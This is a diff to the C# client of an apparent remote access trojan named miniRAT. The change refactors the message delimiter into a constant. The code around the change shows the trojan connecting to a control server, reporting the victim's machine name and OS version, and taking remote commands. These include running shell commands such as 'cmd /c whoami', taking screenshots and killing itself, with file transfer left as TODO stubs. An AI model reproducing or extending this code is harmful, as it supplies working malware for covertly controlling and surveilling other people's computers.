@@ -18,7 +18,7 @@ namespace miniRAT
         static int clientID = -1;
         static TcpClient tcpClient;
         private static Mutex sendMutex = new Mutex();
-        
+        const string separator = "|||";
 
         public static Boolean ConnectToServer(string []args)
         {
@@ -82,10 +82,10 @@ namespace miniRAT
                 NetworkStream serverStream = clientSocket.GetStream();
 
 
-                //Send (clientid|||osVersion|||clientversion|||system name)
-                byte[] outStream = Encoding.UTF8.GetBytes(string.Format("{0}|||{1}|||{2}|||{3}",
-                    clientID.ToString(), OS.gtOSversionInfo(), Assembly.GetExecutingAssembly().GetName().Version.ToString(),
-                    Environment.MachineName));
+                //Send (clientid<separator>osVersion<separator>clientversion<separator>system name)
+                byte[] outStream = Encoding.UTF8.GetBytes(
+                    clientID.ToString()+separator+ OS.gtOSversionInfo()+separator+ Assembly.GetExecutingAssembly().GetName().Version.ToString()+separator
+                    +Environment.MachineName);
 
                 serverStream.Write(outStream, 0, outStream.Length);
                 serverStream.Flush();
@@ -103,8 +103,8 @@ namespace miniRAT
                 UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
                 string helloResponse = UTFEncoder.GetString(helloBytes);
                 
-                string[] stringSeparators = new string[] { "|||" };
-                //response is like: id|||Hello
+                string[] stringSeparators = new string[] { separator };
+                //response is like: id<separator>Hello
                 string[] helloArray = helloResponse.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
                 if (helloArray.Length < 2)//error in hello response 
                     throw new Exception("Error in hello response");
@@ -430,13 +430,13 @@ namespace miniRAT
         /// <summary>
         /// Run server command.
         /// </summary>
-        /// <param name="command">Command is like: cmd|||dir OR screenshot OR version.</param>
+        /// <param name="command">Command is like: cmd<separator>dir OR screenshot OR version.</param>
         /// <returns>results of command</returns>
         public static string runCommand(TcpClient client, string command)
         {
 
-            //Command is like: run|||cmd|||/c whoami OR screenshot|||port OR version
-            string[] commandArray = command.Split(new string[] { "|||" }, StringSplitOptions.None);
+            //Command is like: run<separator>cmd<separator>/c whoami OR screenshot<separator>port OR version
+            string[] commandArray = command.Split(new string[] { separator }, StringSplitOptions.None);
 
             try
             {
@@ -452,9 +452,9 @@ namespace miniRAT
                         Environment.Exit(0);
                         return "Error, I can't Kill my self !!!!";
                     case "givefile":
-                        return "TODO givefile"; //TODO:give file download|||port|||filePath
+                        return "TODO givefile"; //TODO:give file download<separator>port<separator>filePath
                     case "getfile":
-                        return "TODO getfile"; //TODO:get file download|||port|||filePath
+                        return "TODO getfile"; //TODO:get file download<separator>port<separator>filePath
                     case "testlive":
                         return "isAlive";
                     default:
